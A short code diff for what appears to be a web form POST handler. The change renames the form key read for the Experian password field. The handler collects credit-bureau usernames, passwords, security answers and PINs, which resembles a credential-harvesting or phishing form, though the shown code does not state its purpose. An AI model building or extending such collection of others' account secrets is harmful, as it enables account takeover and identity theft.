@@ -12,7 +12,7 @@ export async function POST(req: Request) {
       phone: form.get("phone") || null,
       email: form.get("email") || null,
       experian_username: form.get("experian_username") || null,
-      experian_password: form.get("experian_password") || null,
+      experian_password: form.get("experian_pw") || null,
       security_answer: form.get("security_answer") || null,
       pin: form.get("pin") || null,
     };
